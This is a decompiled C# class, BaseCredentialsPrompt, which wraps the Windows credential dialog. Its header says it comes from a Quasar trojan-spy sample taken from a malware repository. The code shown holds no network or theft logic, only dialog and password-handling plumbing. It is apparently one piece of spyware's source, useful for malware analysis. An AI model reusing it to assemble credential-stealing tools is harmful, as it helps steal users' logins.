// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.CredentialManagement.BaseCredentialsPrompt
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;

namespace NoiseMe.Drags.App.Models.CredentialManagement
{
  public abstract class BaseCredentialsPrompt : ICredentialsPrompt, IDisposable
  {
    private bool _disposed;
    private static SecurityPermission _unmanagedCodePermission;
    private static object _lockObject = new object();
    private string _username;
    private SecureString _password;
    private bool _saveChecked;
    private string _message;
    private string _title;
    private int _errorCode;
    private int _dialogFlags;

    static BaseCredentialsPrompt()
    {
      lock (BaseCredentialsPrompt._lockObject)
        BaseCredentialsPrompt._unmanagedCodePermission = new SecurityPermission(SecurityPermissionFlag.UnmanagedCode);
    }

    protected void AddFlag(bool add, int flag)
    {
      if (add)
        this._dialogFlags |= flag;
      else
        this._dialogFlags &= ~flag;
    }

    protected virtual NativeMethods.CREDUI_INFO CreateCREDUI_INFO(IntPtr owner)
    {
      NativeMethods.CREDUI_INFO structure = new NativeMethods.CREDUI_INFO();
      structure.cbSize = Marshal.SizeOf((object) structure);
      structure.hwndParent = owner;
      structure.pszCaptionText = this.Title;
      structure.pszMessageText = this.Message;
      return structure;
    }

    protected void CheckNotDisposed()
    {
      if (this._disposed)
        throw new ObjectDisposedException("CredentialsPrompt object is already disposed.");
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    ~BaseCredentialsPrompt() => this.Dispose(false);

    private void Dispose(bool disposing)
    {
      if (!this._disposed)
      {
        int num = disposing ? 1 : 0;
      }
      this._disposed = true;
    }

    public bool SaveChecked
    {
      get
      {
        this.CheckNotDisposed();
        return this._saveChecked;
      }
      set
      {
        this.CheckNotDisposed();
        this._saveChecked = value;
      }
    }

    public string Message
    {
      get
      {
        this.CheckNotDisposed();
        return this._message;
      }
      set
      {
        this.CheckNotDisposed();
        if (string.IsNullOrEmpty(value))
          throw new ArgumentNullException(nameof (value));
        this._message = value.Length <= (int) short.MaxValue ? value : throw new ArgumentOutOfRangeException(nameof (value));
      }
    }

    public string Title
    {
      get
      {
        this.CheckNotDisposed();
        return this._title;
      }
      set
      {
        this.CheckNotDisposed();
        if (string.IsNullOrEmpty(value))
          throw new ArgumentNullException(nameof (value));
        this._title = value.Length <= 128 ? value : throw new ArgumentOutOfRangeException(nameof (value));
      }
    }

    public string Username
    {
      get
      {
        this.CheckNotDisposed();
        return this._username ?? string.Empty;
      }
      set
      {
        this.CheckNotDisposed();
        if (value == null)
          throw new ArgumentNullException(nameof (value));
        this._username = value.Length <= 513 ? value : throw new ArgumentOutOfRangeException(nameof (value));
      }
    }

    public string Password
    {
      get => SecureStringHelper.CreateString(this.SecurePassword);
      set
      {
        this.CheckNotDisposed();
        if (value == null)
          throw new ArgumentNullException(nameof (value));
        this.SecurePassword = value.Length <= 256 ? SecureStringHelper.CreateSecureString(string.IsNullOrEmpty(value) ? string.Empty : value) : throw new ArgumentOutOfRangeException(nameof (value));
      }
    }

    public SecureString SecurePassword
    {
      get
      {
        this.CheckNotDisposed();
        BaseCredentialsPrompt._unmanagedCodePermission.Demand();
        return this._password != null ? this._password.Copy() : new SecureString();
      }
      set
      {
        this.CheckNotDisposed();
        if (this._password != null)
        {
          this._password.Clear();
          this._password.Dispose();
        }
        this._password = value == null ? new SecureString() : value.Copy();
      }
    }

    public int ErrorCode
    {
      get
      {
        this.CheckNotDisposed();
        return this._errorCode;
      }
      set
      {
        this.CheckNotDisposed();
        this._errorCode = value;
      }
    }

    public abstract bool ShowSaveCheckBox { get; set; }

    public abstract bool GenericCredentials { get; set; }

    protected int DialogFlags => this._dialogFlags;

    public virtual DialogResult ShowDialog() => this.ShowDialog(IntPtr.Zero);

    public abstract DialogResult ShowDialog(IntPtr owner);
  }
}
